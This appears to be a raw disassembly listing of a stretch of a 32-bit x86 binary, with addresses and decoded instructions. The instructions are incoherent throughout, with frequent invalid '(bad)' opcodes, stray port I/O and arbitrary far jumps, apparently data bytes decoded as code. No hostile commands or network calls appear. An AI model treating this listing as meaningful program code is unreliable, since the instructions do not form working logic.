  42dc1c:	fidivr WORD PTR [esi-0x19]
  42dc1f:	pop    ebx
  42dc20:	mov    dh,0x5b
  42dc22:	into   
  42dc23:	in     eax,dx
  42dc24:	adc    esp,ecx
  42dc26:	(bad)  
  42dc27:	adc    BYTE PTR [ebp-0x28],dh
  42dc2a:	or     ebp,DWORD PTR [ebp-0x27]
  42dc2d:	aad    0xc4
  42dc2f:	outs   dx,DWORD PTR ds:[esi]
  42dc30:	sbb    eax,0x66774a8f
  42dc35:	push   0x7b433022
  42dc3a:	and    al,0x9
  42dc3c:	push   edx
  42dc3d:	and    bh,bh
  42dc3f:	mov    gs,WORD PTR [eax]
  42dc41:	dec    edi
  42dc42:	inc    ebp
  42dc43:	mov    edi,0x4723333a
  42dc48:	push   esi
  42dc49:	cdq    
  42dc4a:	and    ebx,esp
  42dc4c:	fstp   QWORD PTR [esi-0x76]
  42dc4f:	xchg   edx,eax
  42dc50:	outs   dx,BYTE PTR ds:[esi]
  42dc51:	cmc    
  42dc52:	sbb    esi,DWORD PTR [eax+0x45409d1c]
  42dc58:	retf   
  42dc59:	jb     0x42dcbc
  42dc5b:	es jno 0x42dc27
  42dc5e:	and    al,0x70
  42dc60:	shl    BYTE PTR [ebp+eax*2-0x1b],1
  42dc64:	test   al,0x0
  42dc66:	fdecstp 
  42dc68:	xor    BYTE PTR [eax],bh
  42dc6a:	mov    bl,0xad
  42dc6c:	aad    0xe4
  42dc6e:	mov    ecx,0xf1db9bca
  42dc73:	push   ebp
  42dc74:	or     cl,BYTE PTR [esi-0x20]
  42dc77:	pop    es
  42dc78:	out    dx,eax
  42dc79:	and    dl,BYTE PTR [esi+0x37]
  42dc7c:	clc    
  42dc7d:	adc    esp,DWORD PTR cs:[eax+0x3b539339]
  42dc84:	ror    BYTE PTR [ecx+0x46854651],0x50
  42dc8b:	pxor   mm3,mm5
  42dc8e:	jmp    0x42dc3e
  42dc90:	add    al,0x0
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	sbb    ah,BYTE PTR [esi+0x4f]
  42dd03:	test   BYTE PTR [eax-0x15],0x1
  42dd07:	add    BYTE PTR ds:0x7d000001,al
  42dd0d:	xchg   esp,eax
  42dd0e:	out    0xe2,eax
  42dd10:	lock dec eax
  42dd12:	dec    ecx
  42dd13:	aad    0x66
  42dd15:	fcmovnb st,st(3)
  42dd17:	add    ch,al
  42dd19:	xchg   edi,eax
  42dd1a:	enter  0xa729,0xa1
  42dd1e:	enter  0x1268,0x2c
  42dd22:	xor    ecx,DWORD PTR [esi]
  42dd24:	test   DWORD PTR [esi],ebx
  42dd26:	stc    
  42dd27:	ss stos DWORD PTR es:[edi],eax
  42dd29:	or     eax,0xfdb25c60
  42dd2e:	lods   eax,DWORD PTR ds:[esi]
  42dd2f:	aaa    
  42dd30:	push   0x81b55bb0
  42dd35:	mov    al,ds:0xbef623e0
  42dd3a:	adc    esi,edi
  42dd3c:	or     ebp,edx
  42dd3e:	retf   0x1794
  42dd41:	inc    ebx
  42dd42:	fcomp  QWORD PTR [esi-0x1d]
  42dd45:	mov    ch,BYTE PTR [eax]
  42dd47:	dec    eax
  42dd48:	jg     0x42dda4
  42dd4a:	cdq    
  42dd4b:	push   ebx
  42dd4c:	mov    cl,0xc6
  42dd4e:	loope  0x42ddbe
  42dd50:	cmp    bl,bh
  42dd52:	inc    ebx
  42dd53:	rcr    DWORD PTR [eax],1
  42dd55:	xor    ch,BYTE PTR ds:0x74867093
  42dd5b:	push   esi
  42dd5c:	int3   
  42dd5d:	push   ebx
  42dd5e:	das    
  42dd5f:	add    ah,BYTE PTR [ebp+0x65]
  42dd62:	mov    al,0x7d
  42dd64:	or     DWORD PTR [eax],0x5d39c193
  42dd6a:	dec    ebp
  42dd6b:	pop    ebp
  42dd6c:	out    0x8d,eax
  42dd6e:	inc    ebp
  42dd6f:	mov    dh,0xe4
  42dd71:	retf   
  42dd72:	fmul   st(0),st
  42dd74:	mov    esi,ss
  42dd76:	ins    DWORD PTR es:[edi],dx
  42dd77:	and    eax,0x7b578cb9
  42dd7c:	add    eax,0x9b2cfbf5
  42dd81:	lds    ebp,FWORD PTR [ecx-0x7f]
  42dd84:	jnp    0x42dd97
  42dd86:	mov    DWORD PTR [ebx+0x66457a20],0xc1a8d940
  42dd90:	ins    DWORD PTR es:[edi],dx
  42dd91:	dec    edi
  42dd92:	dec    bh
  42dd94:	pop    esp
  42dd95:	sub    eax,esi
  42dd97:	aad    0xa8
  42dd99:	vpmulhuw xmm7,xmm6,XMMWORD PTR [ebx-0x767d7116]
  42dda1:	mov    eax,ds:0xddc505e3
  42dda6:	jne    0x42de25
  42dda8:	int    0x69
  42ddaa:	fisubr DWORD PTR [edi]
  42ddac:	sbb    eax,0x39c2d73a
  42ddb1:	and    BYTE PTR [eax-0x57235446],dh
  42ddb7:	adc    DWORD PTR [edx],esi
  42ddb9:	retf   0x555d
  42ddbc:	pop    es
  42ddbd:	gs cmp eax,0x25586924
  42ddc3:	push   esi
  42ddc4:	sub    BYTE PTR [eax-0x59],0x73
  42ddc8:	bound  eax,QWORD PTR [ebp+0x8aaccf8]
  42ddce:	inc    ebp
  42ddcf:	pop    ecx
  42ddd0:	sbb    eax,0x45d58e70
  42ddd5:	loop   0x42dd79
  42ddd7:	add    esp,ebp
  42ddd9:	adc    DWORD PTR [edx+0x38],esi
  42dddc:	aam    0xe4
  42ddde:	inc    ebx
  42dddf:	daa    
  42dde0:	dec    BYTE PTR [eax+0x1e37bd02]
  42dde6:	mov    al,ds:0x8e06e959
  42ddeb:	in     al,dx
  42ddec:	push   ds
  42dded:	mov    ecx,0x38e2b3f5
  42ddf2:	xor    al,0x8d
  42ddf4:	xchg   DWORD PTR [edi],ecx
  42ddf6:	pop    es
  42ddf7:	ret    0x91a9
  42ddfa:	cwde   
  42ddfb:	loopne 0x42de61
  42ddfd:	pop    edi
  42ddfe:	and    BYTE PTR [esi-0x6c],ch
  42de01:	leave  
  42de02:	dec    ebx
  42de03:	pop    DWORD PTR [ebx+0x5e9e1064]
  42de09:	cmp    ecx,DWORD PTR [ebx-0x28]
  42de0c:	adc    ebp,edx
  42de0e:	sbb    al,0xcb
  42de10:	sub    eax,DWORD PTR [eax]
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	inc    ebx
  42de81:	retf   
  42de82:	dec    ebp
  42de83:	fild   WORD PTR [ebp-0x14]
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0x59000001
  42de8d:	adc    cl,ch
  42de8f:	add    esp,ebp
  42de91:	test   eax,0xce421d72
  42de96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de97:	jecxz  0x42de6b
  42de99:	mov    ds:0xa62bc372,eax
  42de9e:	stos   BYTE PTR es:[edi],al
  42de9f:	cmp    al,0x1a
  42dea1:	and    eax,0x73a5a018
  42dea6:	aam    0x1b
  42dea8:	mov    dl,0xe9
  42deaa:	je     0x42de66
  42deac:	out    dx,eax
  42dead:	mov    dh,0xd0
  42deaf:	pushw  0x944
  42deb3:	fidiv  WORD PTR [esi+0x64]
  42deb6:	dec    edx
  42deb7:	rcr    BYTE PTR [esi+0x2b096b8],cl
  42debd:	out    dx,al
  42debe:	lods   al,BYTE PTR ds:[esi]
  42debf:	mov    edi,0x180826ca
  42dec4:	jne    0x42df24
  42dec6:	dec    edi
  42dec7:	pop    edx
  42dec8:	outs   dx,DWORD PTR ds:[esi]
  42dec9:	pop    ebx
  42deca:	ja     0x42de83
  42decc:	jno    0x42def0
  42dece:	xchg   ebx,eax
  42decf:	cld    
  42ded0:	inc    esp
  42ded1:	push   0x4c1a06a4
  42ded6:	ret    0x5413
  42ded9:	mov    eax,0x9aa179dc
  42dede:	and    edi,ebp
  42dee0:	aaa    
  42dee1:	(bad)  
  42dee2:	fnstsw WORD PTR [edx]
  42dee4:	mov    ch,0x93
  42dee6:	xlat   BYTE PTR ds:[ebx]
  42dee7:	pop    ds
  42dee8:	mov    ecx,0x2f7770e5
  42deed:	cwde   
  42deee:	pop    eax
  42deef:	jle    0x42df5e
  42def1:	rol    DWORD PTR [ecx+0x4993d5a3],0x16
  42def8:	icebp  
  42def9:	aad    0x4a
  42defb:	(bad)  
  42defd:	pop    DWORD PTR [edi+0x4]
  42df00:	cld    
  42df01:	pop    ecx
  42df02:	push   ds
  42df03:	jl     0x42de86
  42df05:	push   cs
  42df06:	je     0x42deac
  42df08:	inc    ebx
  42df09:	sbb    bl,dh
  42df0b:	adc    eax,0xd34ca36f
  42df10:	xchg   esp,eax
  42df11:	or     eax,0x176ec3c2
  42df16:	cmp    bl,BYTE PTR [ecx+edx*4+0x1eb15c2d]
  42df1d:	mov    eax,0x600b42de
  42df22:	push   ebp
  42df23:	sar    DWORD PTR [eax+ecx*2],1
  42df26:	icebp  
  42df27:	out    dx,eax
  42df28:	fdiv   QWORD PTR [edx+0x3fabd4ae]
  42df2e:	imul   esp,DWORD PTR [ebp+0x73689a6],0xd39c44e6
  42df38:	mov    ebp,0x57c72675
  42df3d:	push   0x93f998a2
  42df42:	icebp  
  42df43:	lahf   
  42df44:	sbb    eax,0x72012435
  42df49:	adc    ch,ah
  42df4b:	sub    eax,0x4b1c8e1d
  42df50:	cmp    DWORD PTR [ebp+0x4fab25],0x2c
  42df57:	popf   
  42df58:	pushf  
  42df59:	xchg   ecx,eax
  42df5a:	out    0x12,eax
  42df5c:	in     al,dx
  42df5d:	cmp    eax,0xf786f8db
  42df62:	mov    ebx,0xaced3602
  42df67:	(bad)  
  42df68:	xchg   esi,eax
  42df69:	pop    ds
  42df6a:	mov    cl,0x1b
  42df6c:	mov    bh,0x62
  42df6e:	add    BYTE PTR [eax-0x41],0x16
  42df72:	sub    BYTE PTR [edx-0x19],bl
  42df75:	inc    esi
  42df76:	dec    ebx
  42df77:	je     0x42df1c
  42df79:	push   ebx
  42df7a:	gs popf 
  42df7c:	loop   0x42dfbb
  42df7e:	mov    WORD PTR [ebp+0x13],gs
  42df81:	push   ecx
  42df82:	xor    al,0x3f
  42df84:	or     ecx,edx
  42df86:	push   ebp
  42df87:	in     al,dx
  42df88:	mov    DWORD PTR [eax],edx
  42df8a:	lods   eax,DWORD PTR ds:[esi]
  42df8b:	not    BYTE PTR [esi+0x47]
  42df8e:	cld    
  42df8f:	out    0x55,eax
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x18]
  42e001:	fadd   DWORD PTR [ebp+0x1ed4ae9]
  42e007:	add    BYTE PTR ds:0xe0000001,al
  42e00d:	popa   
  42e00e:	outs   dx,DWORD PTR fs:[esi]
  42e010:	(bad)  
  42e011:	mov    eax,0xb5568eec
  42e016:	inc    edi
  42e017:	in     al,0x4f
  42e019:	adc    al,0xb4
  42e01b:	mov    bl,0xb6
  42e01d:	push   es
  42e01e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e01f:	repnz inc eax
  42e021:	repz mov bl,0xc4
  42e024:	shl    DWORD PTR [esi+0x2b39b44e],0xd7
  42e02b:	jns    0x42dfce
  42e02d:	cs sbb ecx,esp
  42e030:	outs   dx,DWORD PTR ds:[esi]
  42e031:	xchg   esi,ebp
  42e033:	push   esp
  42e034:	pop    edi
  42e035:	rcl    DWORD PTR [edx-0xd],1
  42e038:	pop    esp
  42e039:	sub    BYTE PTR [edx],0x49
  42e03c:	out    dx,eax
  42e03d:	and    al,0xed
  42e03f:	push   ds
  42e040:	arpl   WORD PTR [eax-0x10],dx
  42e043:	push   es
  42e044:	add    eax,DWORD PTR fs:[edx-0x2db0e43d]
  42e04b:	adc    bh,BYTE PTR [edi-0x6daa6b08]
  42e051:	loopne 0x42e020
  42e053:	jmp    0xef58:0x54025fe8
  42e05a:	pop    edi
  42e05b:	xor    BYTE PTR [ecx],ch
  42e05d:	pusha  
  42e05e:	call   0x5b396c18
  42e063:	and    dl,BYTE PTR [esi+0x55]
  42e066:	adc    bl,BYTE PTR [edi+0x1e]
  42e069:	push   ebx
  42e06a:	hlt    
  42e06b:	popf   
  42e06c:	out    dx,al
  42e06d:	sbb    eax,0xdcf32fd3
  42e072:	inc    ebp
  42e073:	xor    ebp,esi
  42e075:	scas   eax,DWORD PTR es:[edi]
  42e076:	imul   ecx,ebx,0x35eee902
  42e07c:	cs jecxz 0x42e0c9
  42e07f:	mov    al,0x8f
  42e081:	pop    ds
  42e082:	xchg   esi,eax
  42e083:	mov    es,WORD PTR [eax+0x646dc8]
  42e089:	pop    eax
  42e08a:	ret    0x6867
  42e08d:	xor    al,0xf1
  42e08f:	push   ss
  42e090:	sahf   
  42e091:	mov    edi,0xc16fcb36
  42e096:	fisubr WORD PTR [edi+0x1e7579b1]
  42e09c:	test   DWORD PTR [edx+0x0],esp
  42e09f:	mov    DWORD PTR [edi],ebp
  42e0a1:	or     ebp,eax
  42e0a3:	add    al,0xbe
  42e0a5:	cwde   
  42e0a6:	sub    eax,0xcc3d0ea3
  42e0ab:	lds    edx,FWORD PTR [eax+0x494d0069]
  42e0b1:	(bad)  
  42e0b2:	in     eax,0xda
  42e0b4:	iret   
  42e0b5:	adc    DWORD PTR [edx],eax
  42e0b7:	mov    edx,0x182e4f78
  42e0bc:	fsub   DWORD PTR [edx+0x2fc58122]
  42e0c2:	sbb    al,0xc6
  42e0c4:	inc    esp
  42e0c5:	jg     0x42e085
  42e0c7:	xchg   edi,eax
  42e0c8:	mov    cl,BYTE PTR [edx]
  42e0ca:	fmul   DWORD PTR [esi+0x2]
  42e0cd:	fcomp  DWORD PTR [edx+esi*1-0x654221b]
  42e0d4:	cdq    
  42e0d5:	enter  0x2872,0x11
  42e0d9:	repz cmp DWORD PTR [ebx],eax
  42e0dc:	pop    edi
  42e0dd:	jg     0x42e0fb
  42e0df:	add    BYTE PTR [edi-0x5e947b4b],ch
  42e0e5:	xchg   ebx,eax
  42e0e6:	into   
  42e0e7:	pop    ecx
  42e0e8:	mov    al,ds:0xc81e2f75
  42e0ed:	mov    ch,0xab
  42e0ef:	ja     0x42e169
  42e0f1:	mov    ah,0x3b
  42e0f3:	lods   eax,DWORD PTR ds:[esi]
  42e0f4:	sbb    esi,DWORD PTR [ebx+0x10d2e090]
  42e0fa:	nop
  42e0fb:	mov    edx,0x96466778
  42e100:	out    0x29,eax
  42e102:	imul   ebx,ecx,0x21
  42e105:	popa   
  42e106:	mov    WORD PTR [esi],ss
  42e108:	adc    eax,0xe3fa0c5d
  42e10d:	les    esi,FWORD PTR [esi+0x98b2]
	...
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	xchg   bx,ax
  42e182:	sub    BYTE PTR [eax+0x1ee4f],dh
  42e188:	add    eax,0xfa000001
  42e18d:	or     dh,cl
  42e18f:	pop    esp
  42e190:	xchg   ecx,eax
  42e191:	arpl   WORD PTR [ebp-0xc],dx
  42e194:	push   ebp
  42e195:	sub    eax,0xa75f1486
  42e19a:	leave  
  42e19b:	nop
  42e19c:	aas    
  42e19d:	clc    
  42e19e:	shl    BYTE PTR [ebx-0x6b],1
  42e1a1:	lock leave 
  42e1a3:	and    BYTE PTR [ebp+eax*8+0x46],0xef
  42e1a8:	dec    ecx
  42e1a9:	les    edi,FWORD PTR [edi]
  42e1ab:	inc    esp
  42e1ac:	into   
  42e1ad:	mov    bl,BYTE PTR [esi-0x80]
  42e1b0:	aad    0x5f
  42e1b2:	data16 sub cl,BYTE PTR [edi-0x20]
  42e1b6:	jmp    0x7cc6e99
  42e1bb:	in     al,0x92
  42e1bd:	xchg   ebx,eax
  42e1be:	js     0x42e1b3
  42e1c0:	adc    eax,0xc3403c29
  42e1c5:	or     esi,DWORD PTR [ebp+0x8]
  42e1c8:	jmp    0x42e1b8
  42e1ca:	pmaxub mm4,QWORD PTR [ebx+0x2]
  42e1ce:	pop    ebp
  42e1cf:	push   esi
  42e1d0:	mov    ebx,0x7d23ee6a
  42e1d5:	sub    BYTE PTR [esi-0x9695109],dh
  42e1db:	scas   eax,DWORD PTR es:[edi]
  42e1dc:	lea    esi,[edi]
  42e1de:	push   ecx
  42e1df:	fst    DWORD PTR [ebx+edx*8-0xd1f9e83]
  42e1e6:	and    edx,DWORD PTR [esi]
  42e1e8:	push   cs
  42e1e9:	pop    ebx
  42e1ea:	in     al,dx
  42e1eb:	mov    esp,esp
  42e1ed:	test   eax,0xb9545a89
  42e1f2:	cmp    eax,0x153871f4
  42e1f7:	inc    esi
  42e1f8:	clc    
  42e1f9:	and    ch,cl
  42e1fb:	out    0x9b,al
  42e1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1fe:	and    bl,BYTE PTR ds:0x5788f591
  42e204:	mov    esi,0x3791acba
  42e209:	test   BYTE PTR [edx+0x789483d3],bl
  42e20f:	jnp    0x42e252
  42e211:	fwait
  42e212:	ss xor al,0xde
  42e215:	and    DWORD PTR [esp+eax*1+0x22a9aa03],ebx
  42e21c:	add    ebp,0xb2bdd256
  42e222:	xor    eax,0xdd596f48
  42e227:	xor    BYTE PTR [ebx+ebp*8-0x34525599],cl
  42e22e:	push   cs
  42e22f:	push   0xd08bba8d
  42e234:	(bad)  
  42e236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e237:	jne    0x42e261
  42e239:	mov    edi,0x6c02d1b0
  42e23e:	icebp  
  42e23f:	xchg   ebx,eax
  42e240:	cmp    eax,0x8501f1ae
  42e245:	cmp    ch,BYTE PTR [ebx]
  42e247:	cmp    eax,0x28f77421
  42e24c:	lahf   
  42e24d:	sbb    DWORD PTR [edx+edi*4-0x78e945e4],edx
  42e254:	(bad)  
  42e255:	into   
  42e256:	in     eax,0x43
  42e258:	sbb    ch,cl
  42e25a:	mov    bh,0x5f
  42e25c:	rcr    DWORD PTR [esi+0xc],cl
  42e25f:	test   eax,0x45007997
  42e264:	loop   0x42e200
  42e266:	adc    DWORD PTR [edx-0x2e5dc588],eax
  42e26c:	mov    ebx,eax
  42e26e:	ror    DWORD PTR [ecx-0x7fdffca0],0xb4
  42e275:	push   es
  42e276:	aad    0xa7
  42e278:	in     al,0x76
  42e27a:	lea    ebx,[edi-0x3e]
  42e27d:	adc    BYTE PTR [ebx+0x29],dh
  42e280:	sbb    edi,ecx
  42e282:	and    esi,DWORD PTR [edx-0x5f349e98]
  42e288:	dec    esi
  42e289:	jle    0x42e2b4
  42e28b:	add    bl,BYTE PTR [ecx-0x44872267]
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xe8199140
  42e301:	add    DWORD PTR [edi+0x30],esp
  42e304:	push   esp
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0x81000001
  42e30d:	xchg   ebx,eax
  42e30e:	das    
  42e30f:	jg     0x42e32b
  42e311:	test   BYTE PTR [ecx-0x19],dl
  42e314:	adc    DWORD PTR [edx],ebp
  42e316:	addr16 xchg ebx,eax
  42e318:	pop    ebp
  42e319:	sub    eax,0x65213874
  42e31e:	inc    edx
  42e31f:	in     al,0x77
  42e321:	(bad)  
  42e322:	mov    esi,0x556100f0
  42e327:	sub    eax,DWORD PTR [esi-0x441e80b0]
  42e32d:	rol    DWORD PTR [edi+0x397fc4a8],cl
  42e333:	jle    0x42e34a
  42e335:	frstor [edi+0x4cd53fae]
  42e33b:	and    cl,bh
  42e33d:	rol    DWORD PTR ds:0xda371660,0xa7
  42e344:	jmp    0x42e37a
  42e346:	mov    ebx,DWORD PTR [esi]
  42e348:	jmp    0xa560:0xe09e4346
  42e34f:	mov    ecx,0x8d343567
  42e354:	mov    eax,ds:0xece9481
  42e359:	cmp    ch,BYTE PTR [ebx]
  42e35b:	sub    BYTE PTR [edx-0x37],al
  42e35e:	imul   edx,DWORD PTR [ebx+0x7f],0xf36faf94
  42e365:	jl     0x42e3ae
  42e367:	push   ds
  42e368:	sbb    DWORD PTR [edi+0x3f],edx
  42e36b:	and    bl,cl
  42e36d:	push   ebx
  42e36e:	sub    al,dh
  42e370:	bound  edi,QWORD PTR [edi+0x6ef322cc]
  42e376:	xchg   esi,eax
  42e377:	pop    ebp
  42e378:	dec    edi
  42e379:	cdq    
  42e37a:	into   
  42e37b:	push   0xc1e0c50a
  42e380:	mov    ah,0x73
  42e382:	test   BYTE PTR [edi+edx*2],dh
  42e385:	inc    eax
  42e386:	retf   0xa159
  42e389:	inc    esi
  42e38a:	in     al,0xdd
  42e38c:	xchg   edx,eax
  42e38d:	sbb    edi,DWORD PTR [eax]
  42e38f:	ins    BYTE PTR es:[edi],dx
  42e390:	repnz mov dl,0x54
  42e393:	or     dl,BYTE PTR ds:0x5ab66f93
  42e399:	and    dl,BYTE PTR [edi-0x3f]
  42e39c:	or     eax,0xe72ebce0
  42e3a1:	scas   al,BYTE PTR es:[edi]
  42e3a2:	pop    ds
  42e3a3:	cwde   
  42e3a4:	cli    
  42e3a5:	and    BYTE PTR ds:[edx],bl
  42e3a8:	sub    ah,BYTE PTR [eax+0x21]
  42e3ab:	rol    BYTE PTR [ebx+0x2ef170e3],0xc5
  42e3b2:	retf   0x376c
  42e3b5:	cmp    esi,ebp
  42e3b7:	(bad)  
  42e3b8:	mov    cl,0x11
  42e3ba:	inc    edi
  42e3bb:	pop    eax
  42e3bc:	dec    ecx
  42e3bd:	imul   edi,DWORD PTR [ecx],0xffffff9e
  42e3c0:	xchg   ebx,eax
  42e3c1:	ds ja  0x42e38f
  42e3c4:	aad    0x14
  42e3c6:	neg    BYTE PTR [edi]
  42e3c8:	mov    ebx,0xa199bbd2
  42e3cd:	adc    DWORD PTR [esi],ecx
  42e3cf:	dec    edi
  42e3d0:	imul   ebp,DWORD PTR [ebx],0xffffff85
  42e3d3:	cmp    al,0xea
  42e3d5:	icebp  
  42e3d6:	js     0x42e3f8
  42e3d8:	rol    DWORD PTR [edx+0x7c],1
  42e3db:	or     al,0x21
  42e3dd:	shl    ah,1
  42e3df:	cmp    BYTE PTR [eax+0x7d],bh
  42e3e2:	xchg   ecx,eax
  42e3e3:	xchg   esi,eax
  42e3e4:	and    eax,0xcd1ba909
  42e3e9:	pop    edx
  42e3ea:	pusha  
  42e3eb:	pop    edx
  42e3ec:	dec    ecx
  42e3ed:	adc    al,0x98
  42e3ef:	xchg   BYTE PTR [ecx+0x722e83ba],bl
  42e3f5:	cmc    
  42e3f6:	loop   0x42e3de
  42e3f8:	adc    al,0xa3
  42e3fa:	adc    eax,0x596a0ffc
  42e3ff:	push   esi
  42e400:	dec    ebx
  42e401:	mov    eax,ds:0x151e8056
  42e406:	dec    edx
  42e407:	scas   eax,DWORD PTR es:[edi]
  42e408:	(bad)  
  42e409:	cdq    
  42e40a:	test   al,0xa5
  42e40c:	jg     0x42e477
  42e40e:	test   DWORD PTR [ebx+0xb0],0x0
	...
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	stos   DWORD PTR es:[edi],eax
  42e481:	enter  0x2b53,0x59
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0x85000001
  42e48d:	test   al,0x80
  42e48f:	shl    BYTE PTR [eax-0x38],0xa
  42e493:	mov    edx,0x2f46f87e
  42e498:	ror    BYTE PTR [ebx-0x52c1c98],1
  42e49e:	jo     0x42e45f
  42e4a0:	es (bad) 
  42e4a2:	jge    0x42e497
  42e4a4:	and    edx,ecx
  42e4a6:	mov    BYTE PTR ss:[ecx],cl
  42e4a9:	cmp    ah,dl
  42e4ab:	xchg   ecx,eax
  42e4ac:	std    
  42e4ad:	jmp    0x21d48bae
  42e4b2:	mov    eax,0x7821f1e9
  42e4b7:	push   ecx
  42e4b8:	adc    BYTE PTR [edi-0x78ddf350],0x4e
  42e4bf:	push   ds
  42e4c0:	mov    BYTE PTR [edi+eax*8],cl
  42e4c3:	mov    ecx,0x1cf5427
  42e4c8:	jmp    0x9990:0xd46b7d96
  42e4cf:	cmp    BYTE PTR [esi],ah
  42e4d1:	jne    0x42e517
  42e4d3:	jb     0x42e4cb
  42e4d5:	mov    ds:0x8b1d5688,al
  42e4da:	sbb    edi,eax
  42e4dc:	sahf   
  42e4dd:	mov    cl,0xb4
  42e4df:	push   ebx
  42e4e0:	retf   
  42e4e1:	sub    eax,0x8287ea5a
  42e4e6:	xchg   edx,eax
  42e4e7:	add    al,0xad
  42e4e9:	mov    bh,0x32
  42e4eb:	jge    0x42e4cc
  42e4ed:	ins    BYTE PTR es:[edi],dx
  42e4ee:	pop    esp
  42e4ef:	push   esp
  42e4f0:	test   BYTE PTR [ecx-0x2328210a],cl
  42e4f6:	xchg   esi,eax
  42e4f7:	inc    ebx
  42e4f8:	(bad)  [edx-0x3e]
  42e4fb:	adc    al,0xe1
  42e4fd:	adc    eax,DWORD PTR [ebx+ebx*8+0x3629ac2c]
  42e504:	lods   al,BYTE PTR ds:[esi]
  42e505:	loop   0x42e4ce
  42e507:	(bad)  
  42e508:	stos   DWORD PTR es:[edi],eax
  42e509:	and    BYTE PTR [edi-0x3377e96b],al
  42e50f:	xor    eax,0x4a4f2870
  42e514:	cmp    BYTE PTR [edi+edx*8],ah
  42e517:	aaa    
  42e518:	mov    bh,BYTE PTR [ebx]
  42e51a:	loopne 0x42e531
  42e51c:	sti    
  42e51d:	pop    ds
  42e51e:	mov    DWORD PTR [ecx-0x42b6a7a1],ebx
  42e524:	jge    0x42e56b
  42e526:	ror    BYTE PTR [ecx],1
  42e528:	popf   
  42e529:	add    al,0x6c
  42e52b:	(bad)  
  42e52c:	(bad)  
  42e52d:	adc    DWORD PTR [ecx-0x2cdc504b],ebx
  42e533:	sub    dl,0xbe
  42e536:	xor    DWORD PTR [eax+0x2e],eax
  42e539:	enter  0x4ac1,0x5b
  42e53d:	mov    eax,0xb49fed11
  42e542:	mov    esp,0x182232a6
  42e547:	xchg   ebx,eax
  42e548:	iret   
  42e549:	icebp  
  42e54a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e54b:	jns    0x42e569
  42e54d:	sbb    ecx,DWORD PTR [edi+0x273cc2af]
  42e553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e554:	and    BYTE PTR [edx+0x1bbcc1c8],dh
  42e55a:	mov    cl,0xe7
  42e55c:	mov    esp,0x3cf07607
  42e561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e562:	adc    edi,ecx
  42e564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e565:	int3   
  42e566:	dec    eax
  42e567:	arpl   WORD PTR [edx+0x4c3a1ac6],cx
  42e56d:	sahf   
  42e56e:	sbb    al,0x8a
  42e570:	out    0xd2,eax
  42e572:	pop    ds
  42e573:	push   ss
  42e574:	in     al,0x59
  42e576:	fwait
  42e577:	cdq    
  42e578:	sar    BYTE PTR [ecx],cl
  42e57a:	outs   dx,DWORD PTR ds:[esi]
  42e57b:	cmp    DWORD PTR [edi-0x5672297a],edx
  42e581:	adc    al,0x40
  42e583:	inc    ebx
  42e584:	pop    ds
  42e585:	add    eax,0xd1f2e0f3
  42e58a:	out    dx,al
  42e58b:	xchg   esi,eax
  42e58c:	jnp    0x42e539
  42e58e:	pop    es
  42e58f:	ins    BYTE PTR es:[edi],dx
  42e590:	pop    edi
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	xchg   esp,eax
  42e601:	rcl    BYTE PTR [ecx+0x1f15ea6],0x0
  42e608:	add    eax,0xf1000001
  42e60d:	ror    BYTE PTR [ebx-0x3f8715fb],0x85
  42e614:	cld    
  42e615:	xor    edx,esp
  42e617:	mov    DWORD PTR [ebx],ebx
  42e619:	es or  ch,ah
  42e61c:	int3   
  42e61d:	mov    fs,WORD PTR [ebx+0x49bd5c34]
  42e623:	ds leave 
  42e625:	xlat   BYTE PTR ds:[ebx]
  42e626:	lea    edi,[edi]
  42e628:	mul    DWORD PTR [ebx-0x408aa632]
  42e62e:	sbb    BYTE PTR [esi+0x2f1e20f7],dh
  42e634:	std    
  42e635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e636:	and    al,0xfd
  42e638:	(bad)  
  42e639:	adc    ebx,DWORD PTR [ebx+0x2b]
  42e63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e63d:	arpl   dx,dx
  42e63f:	repz leave 
  42e641:	mov    ebx,0xf3c83df9
  42e646:	cdq    
  42e647:	lods   eax,DWORD PTR ds:[esi]
  42e648:	mov    bh,BYTE PTR [ebp-0x33]
